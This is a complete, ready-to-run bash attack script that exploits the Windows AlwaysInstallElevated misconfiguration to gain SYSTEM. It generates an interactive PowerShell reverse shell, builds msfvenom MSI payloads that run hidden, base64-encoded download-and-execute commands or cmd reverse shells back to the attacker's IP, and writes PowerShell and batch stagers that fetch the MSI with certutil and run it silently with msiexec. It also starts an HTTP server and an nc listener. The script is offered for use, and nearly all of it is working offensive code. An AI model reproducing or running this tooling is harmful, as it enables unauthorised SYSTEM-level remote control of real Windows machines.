#!/usr/bin/env bash
# aie.sh — AlwaysInstallElevated → SYSTEM
# Automatically detects target architecture (x86/x64) and PowerShell availability.
# Covers all vulnerable Windows targets: with or without PowerShell.
#
# Generated files:
#   revshell_ps.ps1      — Interactive PowerShell reverse shell (line-buffered read)
#   update_ps_x64.msi    — MSI: downloads and runs revshell_ps.ps1 as SYSTEM (x64)
#   update_ps_x86.msi    — MSI: downloads and runs revshell_ps.ps1 as SYSTEM (x86)
#   update_cmd_x64.msi   — MSI: cmd.exe reverse shell as SYSTEM (x64, no PS needed)
#   update_cmd_x86.msi   — MSI: cmd.exe reverse shell as SYSTEM (x86, no PS needed)
#   get-script.ps1       — PS entry point: checks registry + arch + launches correct MSI
#   get-script.bat       — CMD entry point: checks registry + arch + launches correct MSI

set -euo pipefail

LPORT_HTTP=8005
PAYLOAD_NAME="update"
HTTP_PID=""
WORKDIR=""

# ---------- Usage ----------
usage() {
    cat <<USAGE
Usage: $0 -i <ATTACKER_IP> -p <LPORT> [-w <HTTP_PORT>]

  -i  Your attacker machine IP (LHOST)
  -p  Port to receive the reverse shell on (LPORT)
  -w  HTTP server port used to serve the payloads (default: 8005)
  -h  Show this help message

Target architecture (x86/x64) is auto-detected:
  - get-script.ps1 uses [Environment]::Is64BitOperatingSystem
  - get-script.bat uses %PROCESSOR_ARCHITECTURE% / %PROCESSOR_ARCHITEW6432%

Both entry points:
  1. Verify HKLM and HKCU AlwaysInstallElevated keys (both must be 1/0x1)
  2. Detect target OS architecture
  3. Detect PowerShell availability
  4. Download and execute the correct MSI payload

Commands to run on the target:
  WITH PowerShell:
    powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://LHOST:HTTP_PORT/get-script.ps1')"

  WITHOUT PowerShell (CMD only):
    certutil -urlcache -split -f "http://LHOST:HTTP_PORT/get-script.bat" "%TEMP%\\get-script.bat" && "%TEMP%\\get-script.bat"

Requirements: msfvenom, python3, nc
USAGE
    exit 1
}

# ---------- Banner ----------
banner() {
    local title="$1"
    local width=54
    local sep
    sep=$(printf '═%.0s' $(seq 1 $width))
    local title_pad=$(( (width - ${#title}) / 2 ))
    printf "\n  ╔%s╗\n" "$sep"
    printf "  ║%*s%s%*s║\n" \
        "$title_pad" "" "$title" \
        $(( width - title_pad - ${#title} )) ""
    printf "  ║  %-*s║\n" $(( width - 2 )) ""
    printf "  ║  %-*s║\n" $(( width - 2 )) "LHOST : ${LHOST}"
    printf "  ║  %-*s║\n" $(( width - 2 )) "LPORT : ${LPORT}  (reverse shell)"
    printf "  ║  %-*s║\n" $(( width - 2 )) "HTTP  : ${LPORT_HTTP}"
    printf "  ║  %-*s║\n" $(( width - 2 )) "ARCH  : auto-detect (x86 + x64)"
    printf "  ╚%s╝\n\n" "$sep"
}

# ---------- Cleanup ----------
cleanup() {
    echo
    echo "[*] Cleaning up..."
    if [[ -n "$HTTP_PID" ]] && kill -0 "$HTTP_PID" 2>/dev/null; then
        kill "$HTTP_PID" 2>/dev/null || true
        echo "[*] HTTP server (PID ${HTTP_PID}) stopped."
    fi
    if [[ -n "$WORKDIR" && -d "$WORKDIR" ]]; then
        rm -rf "$WORKDIR"
        echo "[*] Temporary directory ${WORKDIR} removed."
    fi
}
trap cleanup EXIT INT TERM

# ---------- Parse args ----------
while getopts "i:p:w:h" opt; do
    case $opt in
        i) LHOST="$OPTARG" ;;
        p) LPORT="$OPTARG" ;;
        w) LPORT_HTTP="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

[[ -z "${LHOST:-}" || -z "${LPORT:-}" ]] && usage

# ---------- Paths ----------
WORKDIR="$(mktemp -d /tmp/aie.XXXXXX)"

MSI_PS_X64="${WORKDIR}/${PAYLOAD_NAME}_ps_x64.msi"
MSI_PS_X86="${WORKDIR}/${PAYLOAD_NAME}_ps_x86.msi"
MSI_CMD_X64="${WORKDIR}/${PAYLOAD_NAME}_cmd_x64.msi"
MSI_CMD_X86="${WORKDIR}/${PAYLOAD_NAME}_cmd_x86.msi"

PS1_REVSHELL="${WORKDIR}/revshell_ps.ps1"
PS1_ENTRY="${WORKDIR}/get-script.ps1"
BAT_ENTRY="${WORKDIR}/get-script.bat"

banner "AlwaysInstallElevated → SYSTEM"
echo "[*] Working directory: ${WORKDIR}"

# ---------- 1. revshell_ps.ps1 ----------
# Single script for both architectures — the MSI invoking it changes, not this file.
# Reads bytes until \n before executing to avoid character-by-character execution.
# Normalizes line endings to \r\n for correct rendering on the attacker's terminal.
echo "[*] Generating revshell_ps.ps1..."
cat > "$PS1_REVSHELL" <<EOF
\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}', ${LPORT})
\$stream = \$client.GetStream()
[byte[]]\$buf = New-Object byte[] 4096
\$sb = New-Object System.Text.StringBuilder

while (\$true) {
    \$prompt = "PS " + (Get-Location).Path + "> "
    \$promptBytes = [System.Text.Encoding]::UTF8.GetBytes(\$prompt)
    \$stream.Write(\$promptBytes, 0, \$promptBytes.Length)
    \$stream.Flush()

    \$sb.Clear() | Out-Null
    do {
        \$n = \$stream.Read(\$buf, 0, \$buf.Length)
        if (\$n -eq 0) { break }
        \$sb.Append([System.Text.Encoding]::UTF8.GetString(\$buf, 0, \$n)) | Out-Null
    } while (-not \$sb.ToString().Contains("\`n"))

    \$cmd = \$sb.ToString().Trim()
    if (\$cmd -eq '')     { continue }
    if (\$cmd -eq 'exit') { break }

    try {
        \$output = Invoke-Expression \$cmd 2>&1 | Out-String
    } catch {
        \$output = "ERROR: \$_\`r\`n"
    }

    if (\$output.Length -gt 0) {
        \$output = \$output -replace "(?<!\`r)\`n", "\`r\`n"
        \$outBytes = [System.Text.Encoding]::UTF8.GetBytes(\$output)
        \$stream.Write(\$outBytes, 0, \$outBytes.Length)
        \$stream.Flush()
    }
}
\$client.Close()
EOF

# ---------- 2. MSI PowerShell payloads (x64 and x86) ----------
# MSI executes: powershell -enc <base64(IEX(DownloadString(revshell_ps.ps1)))>
# The reverse shell logic stays in revshell_ps.ps1 — the MSI only fetches it.
FETCH_CMD="IEX(New-Object Net.WebClient).DownloadString('http://${LHOST}:${LPORT_HTTP}/revshell_ps.ps1')"
FETCH_B64=$(printf '%s' "$FETCH_CMD" | iconv -t UTF-16LE | base64 -w 0)

echo "[*] Generating PS MSI x64 -> ${MSI_PS_X64}"
msfvenom -p windows/x64/exec \
    CMD="powershell -nop -w hidden -enc ${FETCH_B64}" \
    EXITFUNC=thread \
    -f msi -o "$MSI_PS_X64" 2>/dev/null
echo "[+] $(basename "$MSI_PS_X64") generated."

echo "[*] Generating PS MSI x86 -> ${MSI_PS_X86}"
msfvenom -p windows/exec \
    CMD="powershell -nop -w hidden -enc ${FETCH_B64}" \
    EXITFUNC=thread \
    -f msi -o "$MSI_PS_X86" 2>/dev/null
echo "[+] $(basename "$MSI_PS_X86") generated."

# ---------- 3. MSI CMD fallback payloads (x64 and x86) ----------
echo "[*] Generating CMD MSI x64 -> ${MSI_CMD_X64}"
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST="$LHOST" LPORT="$LPORT" \
    EXITFUNC=thread \
    -f msi -o "$MSI_CMD_X64" 2>/dev/null
echo "[+] $(basename "$MSI_CMD_X64") generated."

echo "[*] Generating CMD MSI x86 -> ${MSI_CMD_X86}"
msfvenom -p windows/shell_reverse_tcp \
    LHOST="$LHOST" LPORT="$LPORT" \
    EXITFUNC=thread \
    -f msi -o "$MSI_CMD_X86" 2>/dev/null
echo "[+] $(basename "$MSI_CMD_X86") generated."

# ---------- 4. get-script.ps1 ----------
# PowerShell entry point:
#   1. Checks AlwaysInstallElevated in HKLM and HKCU (both must be 1)
#   2. Detects OS architecture with [Environment]::Is64BitOperatingSystem
#   3. Detects PowerShell availability
#   4. Downloads and runs the correct MSI via msiexec
echo "[*] Generating get-script.ps1..."
cat > "$PS1_ENTRY" <<EOF
# ----------------------------------------------------------------
# AlwaysInstallElevated exploit — PowerShell entry point
# ----------------------------------------------------------------

\$hklmKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" \`
    -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
\$hkcuKey = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" \`
    -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue

\$hklmVal = if (\$hklmKey) { \$hklmKey.AlwaysInstallElevated } else { 0 }
\$hkcuVal = if (\$hkcuKey) { \$hkcuKey.AlwaysInstallElevated } else { 0 }

Write-Host "[*] HKLM AlwaysInstallElevated: \$hklmVal"
Write-Host "[*] HKCU AlwaysInstallElevated: \$hkcuVal"

if (\$hklmVal -ne 1 -or \$hkcuVal -ne 1) {
    Write-Host ""
    Write-Host "[-] Target is NOT vulnerable to AlwaysInstallElevated:" -ForegroundColor Red
    if (\$hklmVal -ne 1) {
        Write-Host "    HKLM\\...\\Installer -> AlwaysInstallElevated = \$hklmVal (required: 1)" -ForegroundColor Yellow
    }
    if (\$hkcuVal -ne 1) {
        Write-Host "    HKCU\\...\\Installer -> AlwaysInstallElevated = \$hkcuVal (required: 1)" -ForegroundColor Yellow
    }
    Write-Host "[-] Aborting. Nothing downloaded or executed." -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "[+] Target is vulnerable! HKLM=1 and HKCU=1." -ForegroundColor Green

# Detect OS architecture (not current process — avoids WOW64 false positives)
if ([Environment]::Is64BitOperatingSystem) {
    \$arch = "x64"
    Write-Host "[*] Architecture detected: x64" -ForegroundColor Cyan
} else {
    \$arch = "x86"
    Write-Host "[*] Architecture detected: x86" -ForegroundColor Cyan
}

# Detect PowerShell availability
\$psPath = "\$env:SystemRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
\$hasPowerShell = Test-Path \$psPath

if (\$hasPowerShell) {
    Write-Host "[+] PowerShell available -> PS reverse shell as SYSTEM." -ForegroundColor Green
    \$msiName = "${PAYLOAD_NAME}_ps_\$arch.msi"
} else {
    Write-Host "[!] PowerShell not found -> falling back to CMD shell." -ForegroundColor Yellow
    \$msiName = "${PAYLOAD_NAME}_cmd_\$arch.msi"
}

\$msiUrl  = "http://${LHOST}:${LPORT_HTTP}/\$msiName"
\$msiPath = "\$env:TEMP\\\$msiName"

Write-Host "[+] Downloading \$msiName ..."
certutil.exe -urlcache -split -f \$msiUrl \$msiPath | Out-Null

Write-Host "[+] Running msiexec (AlwaysInstallElevated -> SYSTEM)..."
Start-Process msiexec.exe -ArgumentList "/quiet /qn /i \$msiPath" -WindowStyle Hidden
EOF

# ---------- 5. get-script.bat ----------
# Pure CMD entry point (no PowerShell required):
#   1. Checks HKLM and HKCU with reg query + for /f (parses 0x1)
#   2. Detects architecture:
#      - PROCESSOR_ARCHITEW6432 only exists when x86 process runs on x64 OS (WOW64)
#      - PROCESSOR_ARCHITECTURE == AMD64 on native x64 process
#      - PROCESSOR_ARCHITECTURE == x86   on native x86 process
#   3. Downloads correct CMD MSI and runs it via msiexec
echo "[*] Generating get-script.bat..."
cat > "$BAT_ENTRY" <<EOF
@echo off
setlocal

:: ----------------------------------------------------------------
:: AlwaysInstallElevated exploit — pure CMD entry point (no PS)
:: ----------------------------------------------------------------

echo [*] Checking AlwaysInstallElevated...

set "HKLM_VAL=0"
for /f "tokens=3" %%A in ('reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2^>nul') do set "HKLM_VAL=%%A"

set "HKCU_VAL=0"
for /f "tokens=3" %%A in ('reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2^>nul') do set "HKCU_VAL=%%A"

echo [*] HKLM AlwaysInstallElevated: %HKLM_VAL%
echo [*] HKCU AlwaysInstallElevated: %HKCU_VAL%

if /i not "%HKLM_VAL%"=="0x1" goto :not_vuln
if /i not "%HKCU_VAL%"=="0x1" goto :not_vuln

echo.
echo [+] Target is vulnerable! HKLM=0x1 and HKCU=0x1.

:: Detect architecture:
::   PROCESSOR_ARCHITEW6432 only set when x86 process runs on x64 OS (WOW64)
::   PROCESSOR_ARCHITECTURE == AMD64 on native x64 process
::   PROCESSOR_ARCHITECTURE == x86   on native x86 process
set "ARCH=x86"
if defined PROCESSOR_ARCHITEW6432 (
    set "ARCH=x64"
    echo [*] Architecture detected: x64 (WOW64 process^)
    goto :arch_done
)
if /i "%PROCESSOR_ARCHITECTURE%"=="AMD64" (
    set "ARCH=x64"
    echo [*] Architecture detected: x64
    goto :arch_done
)
echo [*] Architecture detected: x86

:arch_done
set "MSI_NAME=${PAYLOAD_NAME}_cmd_%ARCH%.msi"

echo [+] Downloading %MSI_NAME%...
certutil -urlcache -split -f "http://${LHOST}:${LPORT_HTTP}/%MSI_NAME%" "%TEMP%\%MSI_NAME%"
if errorlevel 1 (
    echo [-] Failed to download MSI. Check connectivity to ${LHOST}:${LPORT_HTTP}.
    goto :eof
)

echo [+] Running msiexec (AlwaysInstallElevated -^> SYSTEM^)...
msiexec /quiet /qn /i "%TEMP%\%MSI_NAME%"
goto :eof

:not_vuln
echo.
echo [-] Target is NOT vulnerable to AlwaysInstallElevated.
if /i not "%HKLM_VAL%"=="0x1" echo     HKLM\\...\\Installer -^> AlwaysInstallElevated = %HKLM_VAL% (required: 0x1^)
if /i not "%HKCU_VAL%"=="0x1" echo     HKCU\\...\\Installer -^> AlwaysInstallElevated = %HKCU_VAL% (required: 0x1^)
echo [-] Aborting. Nothing downloaded or executed.

:eof
endlocal
EOF

echo
echo "[*] Generated files in ${WORKDIR}:"
ls -lh "$WORKDIR"
echo

# ---------- 6. HTTP server ----------
echo "[*] Starting HTTP server on port ${LPORT_HTTP}..."
python3 -m http.server "$LPORT_HTTP" --directory "$WORKDIR" >"${WORKDIR}/http.log" 2>&1 &
HTTP_PID=$!
sleep 1

if ! kill -0 "$HTTP_PID" 2>/dev/null; then
    echo "[-] HTTP server failed to start (port ${LPORT_HTTP} already in use?)."
    cat "${WORKDIR}/http.log"
    exit 1
fi
echo "[*] HTTP server running in background (PID ${HTTP_PID})"

echo
echo "=================================================================="
echo "[+] Run one of the following commands on the target:"
echo
echo "  [WITH PowerShell] Checks registry + detects arch + picks correct MSI:"
echo "  powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://${LHOST}:${LPORT_HTTP}/get-script.ps1')\""
echo
echo "  [WITHOUT PowerShell - pure CMD] Checks registry + detects arch:"
echo "  certutil -urlcache -split -f \"http://${LHOST}:${LPORT_HTTP}/get-script.bat\" \"%TEMP%\\get-script.bat\" && \"%TEMP%\\get-script.bat\""
echo "=================================================================="
echo

# ---------- 7. Listener ----------
# No stty raw — the remote shell is a TCP socket, not a PTY.
# The local terminal's default line-buffering (sends on Enter) is exactly
# what the line-buffered read loop in revshell_ps.ps1 expects.
echo "[*] Starting listener on port ${LPORT}..."
nc -lvnp "$LPORT" || true
